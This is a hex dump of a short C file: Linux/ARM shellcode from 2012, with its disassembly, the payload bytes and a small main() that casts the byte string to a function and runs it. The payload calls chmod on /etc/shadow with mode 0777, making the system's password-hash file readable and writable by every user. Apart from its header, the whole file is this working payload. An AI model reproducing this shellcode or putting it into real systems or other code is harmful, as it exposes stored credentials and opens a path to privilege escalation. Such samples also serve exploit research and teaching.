00000000  2f 2a 0d 0a 54 69 74 6c  65 3a 20 20 20 20 20 4c  |/*..Title:     L|
00000010  69 6e 75 78 2f 41 52 4d  20 2d 20 63 68 6d 6f 64  |inux/ARM - chmod|
00000020  28 22 2f 65 74 63 2f 73  68 61 64 6f 77 22 2c 20  |("/etc/shadow", |
00000030  30 37 37 37 29 20 2d 20  34 31 20 62 79 74 65 73  |0777) - 41 bytes|
00000040  0d 0a 44 61 74 65 3a 20  20 20 20 20 20 32 30 31  |..Date:      201|
00000050  32 2d 30 39 2d 30 38 0d  0a 54 65 73 74 65 64 20  |2-09-08..Tested |
00000060  6f 6e 3a 20 41 52 4d 31  31 37 36 4a 5a 46 2d 53  |on: ARM1176JZF-S|
00000070  20 28 76 36 6c 29 0d 0a  41 75 74 68 6f 72 3a 20  | (v6l)..Author: |
00000080  20 20 20 6d 69 64 6e 69  74 65 73 6e 61 6b 65 0d  |   midnitesnake.|
00000090  0a 0d 0a 30 30 30 30 38  30 35 34 20 3c 5f 73 74  |...00008054 <_st|
000000a0  61 72 74 3e 3a 0d 0a 20  20 20 20 38 30 35 34 3a  |art>:..    8054:|
000000b0  09 65 32 38 66 36 30 30  31 20 09 61 64 64 09 72  |.e28f6001 .add.r|
000000c0  36 2c 20 70 63 2c 20 23  31 0d 0a 20 20 20 20 38  |6, pc, #1..    8|
000000d0  30 35 38 3a 09 65 31 32  66 66 66 31 36 20 09 62  |058:.e12fff16 .b|
000000e0  78 09 72 36 0d 0a 20 20  20 20 38 30 35 63 3a 09  |x.r6..    805c:.|
000000f0  34 36 37 38 20 20 20 20  20 20 09 6d 6f 76 09 72  |4678      .mov.r|
00000100  30 2c 20 70 63 0d 0a 20  20 20 20 38 30 35 65 3a  |0, pc..    805e:|
00000110  09 33 30 31 32 20 20 20  20 20 20 09 61 64 64 73  |.3012      .adds|
00000120  09 72 30 2c 20 23 31 38  0d 0a 20 20 20 20 38 30  |.r0, #18..    80|
00000130  36 30 3a 09 32 31 66 66  20 20 20 20 20 20 09 6d  |60:.21ff      .m|
00000140  6f 76 73 09 72 31 2c 20  23 32 35 35 09 3b 20 30  |ovs.r1, #255.; 0|
00000150  78 66 66 0d 0a 20 20 20  20 38 30 36 32 3a 09 33  |xff..    8062:.3|
00000160  31 66 66 20 20 20 20 20  20 09 61 64 64 73 09 72  |1ff      .adds.r|
00000170  31 2c 20 23 32 35 35 09  3b 20 30 78 66 66 0d 0a  |1, #255.; 0xff..|
00000180  20 20 20 20 38 30 36 34  3a 09 33 31 30 31 20 20  |    8064:.3101  |
00000190  20 20 20 20 09 61 64 64  73 09 72 31 2c 20 23 31  |    .adds.r1, #1|
000001a0  0d 0a 20 20 20 20 38 30  36 36 3a 09 32 37 30 66  |..    8066:.270f|
000001b0  20 20 20 20 20 20 09 6d  6f 76 73 09 72 37 2c 20  |      .movs.r7, |
000001c0  23 31 35 0d 0a 20 20 20  20 38 30 36 38 3a 09 64  |#15..    8068:.d|
000001d0  66 30 31 20 20 20 20 20  20 09 73 76 63 09 31 0d  |f01      .svc.1.|
000001e0  0a 20 20 20 20 38 30 36  61 3a 09 31 62 32 34 20  |.    806a:.1b24 |
000001f0  20 20 20 20 20 09 73 75  62 73 09 72 34 2c 20 72  |     .subs.r4, r|
00000200  34 2c 20 72 34 0d 0a 20  20 20 20 38 30 36 63 3a  |4, r4..    806c:|
00000210  09 31 63 32 30 20 20 20  20 20 20 09 61 64 64 73  |.1c20      .adds|
00000220  09 72 30 2c 20 72 34 2c  20 23 30 0d 0a 20 20 20  |.r0, r4, #0..   |
00000230  20 38 30 36 65 3a 09 32  37 30 31 20 20 20 20 20  | 806e:.2701     |
00000240  20 09 6d 6f 76 73 09 72  37 2c 20 23 31 0d 0a 20  | .movs.r7, #1.. |
00000250  20 20 20 38 30 37 30 3a  09 64 66 30 31 20 20 20  |   8070:.df01   |
00000260  20 20 20 09 73 76 63 09  31 0d 0a 20 20 20 20 38  |   .svc.1..    8|
00000270  30 37 32 3a 09 36 35 32  66 20 20 20 20 20 20 09  |072:.652f      .|
00000280  2e 73 68 6f 72 74 09 30  78 36 35 32 66 0d 0a 20  |.short.0x652f.. |
00000290  20 20 20 38 30 37 34 3a  09 37 33 32 66 36 33 37  |   8074:.732f637|
000002a0  34 20 09 2e 77 6f 72 64  09 30 78 37 33 32 66 36  |4 ..word.0x732f6|
000002b0  33 37 34 0d 0a 20 20 20  20 38 30 37 38 3a 09 36  |374..    8078:.6|
000002c0  66 36 34 36 31 36 38 20  09 2e 77 6f 72 64 09 30  |f646168 ..word.0|
000002d0  78 36 66 36 34 36 31 36  38 0d 0a 20 20 20 20 38  |x6f646168..    8|
000002e0  30 37 63 3a 09 34 36 63  30 30 30 37 37 20 09 2e  |07c:.46c00077 ..|
000002f0  77 6f 72 64 09 30 78 34  36 63 30 30 30 37 37 0d  |word.0x46c00077.|
00000300  0a 2a 2f 0d 0a 23 69 6e  63 6c 75 64 65 20 3c 73  |.*/..#include <s|
00000310  74 64 69 6f 2e 68 3e 0d  0a 0d 0a 0d 0a 63 68 61  |tdio.h>......cha|
00000320  72 20 73 68 65 6c 6c 63  6f 64 65 5b 5d 20 3d 20  |r shellcode[] = |
00000330  22 5c 78 30 31 5c 78 36  30 5c 78 38 66 5c 78 65  |"\x01\x60\x8f\xe|
00000340  32 22 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |2"..            |
00000350  20 20 20 20 20 20 20 22  5c 78 31 36 5c 78 66 66  |       "\x16\xff|
00000360  5c 78 32 66 5c 78 65 31  22 0d 0a 09 09 20 20 20  |\x2f\xe1"....   |
00000370  22 5c 78 37 38 5c 78 34  36 22 0d 0a 09 09 20 20  |"\x78\x46"....  |
00000380  20 22 5c 78 31 32 5c 78  33 30 22 0d 0a 20 20 20  | "\x12\x30"..   |
00000390  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003a0  22 5c 78 66 66 5c 78 32  31 22 0d 0a 09 09 20 20  |"\xff\x21"....  |
000003b0  20 22 5c 78 66 66 5c 78  33 31 22 0d 0a 20 20 20  | "\xff\x31"..   |
000003c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003d0  22 5c 78 30 31 5c 78 33  31 22 0d 0a 09 09 20 20  |"\x01\x31"....  |
000003e0  20 22 5c 78 30 66 5c 78  32 37 22 0d 0a 20 20 20  | "\x0f\x27"..   |
000003f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000400  22 5c 78 30 31 5c 78 64  66 22 0d 0a 09 09 20 20  |"\x01\xdf"....  |
00000410  20 22 5c 78 32 34 5c 78  31 62 22 0d 0a 09 09 20  | "\x24\x1b".... |
00000420  20 20 22 5c 78 32 30 5c  78 31 63 22 0d 0a 09 09  |  "\x20\x1c"....|
00000430  20 20 20 22 5c 78 30 31  5c 78 32 37 22 0d 0a 09  |   "\x01\x27"...|
00000440  09 20 20 20 22 5c 78 30  31 5c 78 64 66 22 0d 0a  |.   "\x01\xdf"..|
00000450  09 09 20 20 20 22 5c 78  32 66 5c 78 36 35 22 0d  |..   "\x2f\x65".|
00000460  0a 09 09 20 20 20 22 5c  78 37 34 5c 78 36 33 5c  |...   "\x74\x63\|
00000470  78 32 66 5c 78 37 33 22  0d 0a 09 09 20 20 20 22  |x2f\x73"....   "|
00000480  5c 78 36 38 5c 78 36 31  5c 78 36 34 5c 78 36 66  |\x68\x61\x64\x6f|
00000490  22 0d 0a 09 09 20 20 20  22 5c 78 37 37 5c 78 30  |"....   "\x77\x0|
000004a0  30 22 0d 0a 09 09 20 20  20 22 5c 78 63 30 5c 78  |0"....   "\xc0\x|
000004b0  34 36 22 3b 0d 0a 0d 0a  69 6e 74 20 6d 61 69 6e  |46";....int main|
000004c0  28 29 0d 0a 7b 0d 0a 09  66 70 72 69 6e 74 66 28  |()..{...fprintf(|
000004d0  73 74 64 6f 75 74 2c 22  4c 65 6e 67 74 68 3a 20  |stdout,"Length: |
000004e0  25 64 5c 6e 22 2c 73 74  72 6c 65 6e 28 73 68 65  |%d\n",strlen(she|
000004f0  6c 6c 63 6f 64 65 29 29  3b 0d 0a 20 20 20 20 20  |llcode));..     |
00000500  20 20 20 28 2a 28 76 6f  69 64 28 2a 29 28 29 29  |   (*(void(*)())|
00000510  20 73 68 65 6c 6c 63 6f  64 65 29 28 29 3b 0d 0a  | shellcode)();..|
00000520  0d 0a 72 65 74 75 72 6e  20 30 3b 0d 0a 7d        |..return 0;..}|
0000052e
